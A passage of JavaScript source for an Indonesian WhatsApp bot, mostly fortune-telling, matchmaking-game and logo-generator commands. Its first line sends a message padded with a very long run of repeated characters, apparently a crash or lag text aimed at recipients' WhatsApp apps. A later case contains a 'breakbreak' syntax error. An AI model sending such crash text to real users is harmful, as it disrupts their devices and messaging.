reply(`${teks1}ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ${teks2}`)
}
break
case 'quotes' : {
var res = await Quotes()
const buttons = [
{buttonId: `${prefix}${command}`, buttonText: {displayText: '𝗡𝗘𝗫𝗧'}, type: 1}
]
var zero = {
text: `Quotes: ${res.quotes}
Author: ${res.author}`,
footer: creator,
buttons: buttons,
headerType: 1
}
zeroyt7.sendMessage(from, zero, { quoted : fkontak })
}
break
case 'halah': {
if (!m.quoted && !text) return reply(`Kirim/reply text dengan caption ${prefix + command}`)
ter = command[1].toLowerCase()
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
}
break
case 'jadian': {
if (!m.isGroup) return reply(mess.group)
var member = participants.map(u => u.id)
var orang = member[Math.floor(Math.random() * member.length)]
var jodoh = member[Math.floor(Math.random() * member.length)]
var jawab = `Ciee yang Jadian, Jangan Lupa Pajak Jadiannya

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
var menst = [orang, jodoh]
var buttons = [
{ buttonId: 'jadian', buttonText: { displayText: '𝗝𝗔𝗗𝗜𝗔𝗡' }, type: 1 }
]
await zeroyt7.sendButtonText(from, buttons, jawab, creator, fkontak, {mentions: menst})
}
break
case 'jodohku': {
if (!m.isGroup) return reply(mess.group)
var member = participants.map(u => u.id)
var me = m.sender
var jodoh = member[Math.floor(Math.random() * member.length)]
var jawab = `Jodoh Mu Adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}\nINI CUMA GAME OK`
var ments = [me, jodoh]
var buttons = [
{ buttonId: 'jodohku', buttonText: { displayText: '𝗝𝗢𝗗𝗢𝗛𝗞𝗨' }, type: 1 }
]
await zeroyt7.sendButtonText(from, buttons, jawab, creator, fkontak, {mentions: ments})
}
break
case 'nomerhoki': {
if (!Number(text)) return reply(`Masukan Nomer Hp Nya\nContoh : ${prefix + command} ${me.split('@')[0]}`)
var anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return reply(anu.message)
txt = `*Nomor HP :* ${anu.message.nomer_hp}
*Angka Shuzi :* ${anu.message.angka_shuzi}
*Energi Positif :*
- Kekayaan : ${anu.message.energi_positif.kekayaan}
- Kesehatan : ${anu.message.energi_positif.kesehatan}
- Cinta : ${anu.message.energi_positif.cinta}
- Kestabilan : ${anu.message.energi_positif.kestabilan}
- Persentase : ${anu.message.energi_positif.persentase}
*Energi Negatif :*
- Perselisihan : ${anu.message.energi_negatif.perselisihan}
- Kehilangan : ${anu.message.energi_negatif.kehilangan}
- Malapetaka : ${anu.message.energi_negatif.malapetaka}
- Kehancuran : ${anu.message.energi_negatif.kehancuran}
- Persentase : ${anu.message.energi_negatif.persentase}`
zeroyt7.sendText(from, txt, fkontak)
}
breakbreak
case 'artimimpi': {
if (!text) return reply(`Masukan Mimpi Nya\nContoh : ${prefix + command} Cinta`)
var anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return reply(anu.message)
txt = `*Mimpi :* ${anu.message.mimpi}
*Arti :* ${anu.message.arti}
*Solusi :* ${anu.message.solusi}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'artinama': {
if (!text) return reply(`Masukan Nama Nya\nContoh : ${prefix + command} Pinot`)
var anu = await primbon.arti_nama(text)
if (anu.status == false) return reply(anu.message)
txt = `*Nama :* ${anu.message.nama}
*Arti :* ${anu.message.arti}
*Catatan :* ${anu.message.catatan}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'ramaljodoh': {
if (!text) return reply(`Masukan Nama Kamu, Pasangan Kamu & Tgl Lahir Kalian\nContoh : ${prefix + command} Pinot, 14, 8, 2002, Byzeem, 15, 5, 1999`)
var [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
var anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
txt = `*Nama Anda :* ${anu.message.nama_anda.nama}
*Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}
*Nama Pasangan :* ${anu.message.nama_pasangan.nama}
*Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}
*Hasil :* ${anu.message.result}
*Catatan :* ${anu.message.catatan}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'ramaljodohbali': {
if (!text) return reply(`Masukan Nama Kamu, Pasangan Kamu & Tgl Lahir Kalian\nContoh : ${prefix + command} Pinot, 14, 8, 2002, Byzeem, 15, 5, 1999`)
var [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
var anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
txt = `*Nama Anda :* ${anu.message.nama_anda.nama}
*Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}
*Nama Pasangan :* ${anu.message.nama_pasangan.nama}
*Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}
*Hasil :* ${anu.message.result}
*Catatan :* ${anu.message.catatan}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'suamiistri': {
if (!text) return reply(`Masukan Nama Kamu, Pasangan Kamu & Tgl Lahir Kalian\nContoh : ${prefix + command} Pinot, 14, 8, 2002, Byzeem, 15, 5, 1999`)
var [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
var anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
txt = `*Nama Suami :* ${anu.message.suami.nama}
*Lahir Suami :* ${anu.message.suami.tgl_lahir}
*Nama Istri :* ${anu.message.istri.nama}
*Lahir Istri :* ${anu.message.istri.tgl_lahir}
*Hasil :* ${anu.message.result}
*Catatan :* ${anu.message.catatan}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'ramalcinta': {
if (!text) return reply(`Masukan Nama Kamu, Pasangan Kamu & Tgl Lahir Kalian\nContoh : ${prefix + command} Pinot, 14, 8, 2002, Byzeem, 15, 5, 1999`)
var [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
var anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
txt = `*Nama Anda :* ${anu.message.nama_anda.nama}
*Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}
*Nama Pasangan :* ${anu.message.nama_pasangan.nama}
*Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}
*Sisi Positif :* ${anu.message.sisi_positif}
*Sisi Negatif :* ${anu.message.sisi_negatif}
*Catatan :* ${anu.message.catatan}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'cocoknama': {
if (!text) return reply(`Masukan Nama & Tgl Lahir Kamu\nContoh : ${prefix + command} Pinot, 14, 8, 2002`)
var [nama, tgl, bln, thn] = text.split`,`
var anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
txt = `*Nama :* ${anu.message.nama}
*Lahir :* ${anu.message.tgl_lahir}
*Life Path :* ${anu.message.life_path}
*Destiny :* ${anu.message.destiny}
*Destiny Desire :* ${anu.message.destiny_desire}
*Personality :* ${anu.message.personality}
*Persentase :* ${anu.message.persentase_kecocokan}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'pasangan': {
if (!text) return reply(`Masukan Nama & Pasangan Kamu\nContoh : ${prefix + command} Byzeem|Pinot`)
var [nama1, nama2] = text.split`|`
var anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
txt = `*Nama Anda :* ${anu.message.nama_anda}
*Nama Pasangan :* ${anu.message.nama_pasangan}
*Sisi Positif :* ${anu.message.sisi_positif}
*Sisi Negatif :* ${anu.message.sisi_negatif}`
zeroyt7.sendImage(from,  anu.message.gambar, txt, fkontak)
}
break
case 'sifatusaha': {
if (!text) return reply(`Masukan Tgl Lahir Kamu\nContoh : ${prefix+ command} 14, 8, 2002`)
var [tgl, bln, thn] = text.split`,`
var anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
txt = `*Lahir :* ${anu.message.hari_lahir}
*Usaha :* ${anu.message.usaha}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'rezeki': {
if (!text) return reply(`Masukan Tgl Lahir Kamu\nContoh : ${prefix + command} 14, 8, 2002`)
var [tgl, bln, thn] = text.split`,`
var anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
txt = `*Lahir :* ${anu.message.hari_lahir}
*Rezeki :* ${anu.message.rejeki}
*Catatan :* ${anu.message.catatan}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'pekerjaan': {
if (!text) return reply(`Masukan Tgl Lahir Kamu\nContoh : ${prefix + command} 14, 8, 2002`)
var [tgl, bln, thn] = text.split`,`
var anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
txt = `*Lahir :* ${anu.message.hari_lahir}
*Pekerjaan :* ${anu.message.pekerjaan}
*Catatan :* ${anu.message.catatan}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'penyakit': {
if (!text) return reply(`Masukan Tgl Lahir Kamu\nContoh : ${prefix + command} 14, 8, 2002`)
var [tgl, bln, thn] = text.split`,`
var anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
txt = `*Analisa :* ${anu.message.analisa}
*Sektor :* ${anu.message.sektor}
*Elemen :* ${anu.message.elemen}
*Catatan :* ${anu.message.catatan}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'tarot': {
if (!text) return reply(`Masukan Tgl Lahir Kamu\nContoh : ${prefix + command} 14, 8, 2002`)
var [tgl, bln, thn] = text.split`,`
var anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
txt = `*Lahir :* ${anu.message.tgl_lahir}
*Simbol Tarot :* ${anu.message.simbol_tarot}
*Arti :* ${anu.message.arti}
*Catatan :* ${anu.message.catatan}`
zeroyt7.sendImage(from, anu.message.image, txt, fkontak)
}
break
case 'harisangar': {
if (!text) return reply(`Masukan Tgl Lahir Kamu\nContoh : ${prefix + command} 14, 8, 2002`)
var [tgl, bln, thn] = text.split`,`
var anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
txt = `*Lahir :* ${anu.message.tgl_lahir}
*Hasil :* ${anu.message.result}
*Info :* ${anu.message.info}
*Catatan :* ${anu.message.catatan}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'harisial': {
if (!text) return reply(`Masukan Tgl Lahir Kamu\nContoh : ${prefix + command} 14, 8, 2002`)
var [tgl, bln, thn] = text.split`,`
var anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
txt = `*Hari Lahir :* ${anu.message.hari_lahir}
*Tanggal Lahir :* ${anu.message.tgl_lahir}
*Hari Naas :* ${anu.message.hari_naas}
*Info :* ${anu.message.catatan}
*Catatan :* ${anu.message.info}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'harinaga': {
if (!text) return reply(`Masukan Tgl Lahir Kamu\nContoh : ${prefix + command} 14, 8, 2002`)
var [tgl, bln, thn] = text.split`,`
var anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
txt = `*Hari Lahir :* ${anu.message.hari_lahir}
*Tanggal Lahir :* ${anu.message.tgl_lahir}
*Arah Naga Hari :* ${anu.message.arah_naga_hari}
*Catatan :* ${anu.message.catatan}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'arahrezeki': {
if (!text) return reply(`Masukan Tgl Lahir Kamu\nContoh : ${prefix + command} 14, 8, 2002`)
var [tgl, bln, thn] = text.split`,`
var anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
txt = `*Hari Lahir :* ${anu.message.hari_lahir}
*tanggal Lahir :* ${anu.message.tgl_lahir}
*Arah Rezeki :* ${anu.message.arah_rejeki}
*Catatan :* ${anu.message.catatan}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'peruntungan': {
if (!text) return reply(`Masukan Nama & Tgl Lahir Kamu\nContoh : ${prefix + command} Pinot, 14, 8, 2002`)
var [nama, tgl, bln, thn, untuk] = text.split`,`
var anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return reply(anu.message)
txt = `*Nama :* ${anu.message.nama}
*Lahir :* ${anu.message.tgl_lahir}
*Peruntungan Tahun :* ${anu.message.peruntungan_tahun}
*Hasil :* ${anu.message.result}
*Catatan :* ${anu.message.catatan}`
zeroyt7.sendText(from, txt, fkontak)
}

break
case 'weton': {
if (!text) return reply(`Masukan Tgl Lahir Kamu\nContoh : ${prefix + command} 14, 8, 2002`)
var [tgl, bln, thn] = text.split`,`
var anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
txt = `*Tanggal :* ${anu.message.tanggal}
*Jumlah Neptu :* ${anu.message.jumlah_neptu}
*Watak Hari :* ${anu.message.watak_hari}
*Naga Hari :* ${anu.message.naga_hari}
*Jam Baik :* ${anu.message.jam_baik}
*Watak Kelahiran :* ${anu.message.watak_kelahiran}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'sifat': {
if (!text) return reply(`Masukan Nama & Tgl Lahir Kamu\nContoh : ${prefix + command} Pinot, 14, 8, 2002`)
var [nama, tgl, bln, thn] = text.split`,`
var anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
txt = `*Nama :* ${anu.message.nama}
*Lahir :* ${anu.message.tgl_lahir}
*Garis Hidup :* ${anu.message.garis_hidup}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'keberuntungan': {
if (!text) return reply(`Masukan Nama & Tgl Lahir Kamu\nContoh : ${prefix + command} Pinot, 14, 8, 2002`)
var [nama, tgl, bln, thn] = text.split`,`
var anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
txt = `*Nama :* ${anu.message.nama}
*Lahir :* ${anu.message.tgl_lahir}
*Hasil :* ${anu.message.result}`
zeroyt7.sendText(from, txt, m)
}
break
case 'memancing': {
if (!text) return reply(`Masukan Tgl Nya\nContoh : ${prefix + command} 6, 3, 2023`)
var [tgl, bln, thn] = text.split`,`
var anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
txt = `*Hasil :* ${anu.message.result}
*Catatan :* ${anu.message.catatan}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'masasubur': {
if (!text) return reply(`Masukan Tgl & Siklusnya\nContoh : ${prefix + command} 7, 7, 2023, 15`)
var [tgl, bln, thn, siklus] = text.split`,`
var anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return reply(anu.message)
txt = `*Hasil :* ${anu.message.result}
*Catatan :* ${anu.message.catatan}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case 'zodiak': case 'zodiac': {
if (!text) return reply(`Masukan Tgl Lahir Kamu\nContoh : ${prefix+ command} 6 3 2003`)
var zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
var d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
var date = new Date(text)
if (date == 'Invalid Date') throw date
var d = new Date()
var [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
var birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
var zodiac = await getZodiac(birth[1], birth[2])    
var anu = await primbon.zodiak(zodiac)
if (anu.status == false) return reply(anu.message)
txt = `*Zodiak :* ${anu.message.zodiak}
*Nomor :* ${anu.message.nomor_keberuntungan}
*Aroma :* ${anu.message.aroma_keberuntungan}
*Planet :* ${anu.message.planet_yang_mengitari}
*Bunga :* ${anu.message.bunga_keberuntungan}
*Warna :* ${anu.message.warna_keberuntungan}
*Batu :* ${anu.message.batu_keberuntungan}
*Elemen :* ${anu.message.elemen_keberuntungan}
*Pasangan Zodiak :* ${anu.message.pasangan_zodiak}
*Catatan :* ${anu.message.catatan}`
zeroyt7.sendText(from, txt, fkontak)
}
break
case '3dbox': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'drapwater': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'papercut': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'transformer': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'neondevil': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case '3dstone': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'thunder': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}  
break
case 'graffiti': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot|Cantik`) 
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [`${teks1}`,`${teks2}`])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'pornhub': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot|Cantik`) 
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${teks1}`,`${teks2}`])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'blackpink': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'glitch': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'glitch2': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot|Cantik`) 
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [`${teks1}`,`${teks2}`])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'glitch3': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot|Cantik`) 
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [`${teks1}`,`${teks2}`])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case '3dspace': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot|Cantik`) 
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [`${teks1}`,`${teks2}`])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'lion': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot|Cantik`) 
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [`${teks1}`,`${teks2}`])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case '3dneon': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'neon': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/neon-text-effect-online-879.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'greenneon': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/green-neon-text-effect-874.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'bokeh': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/bokeh-text-effect-876.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'hollographic': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
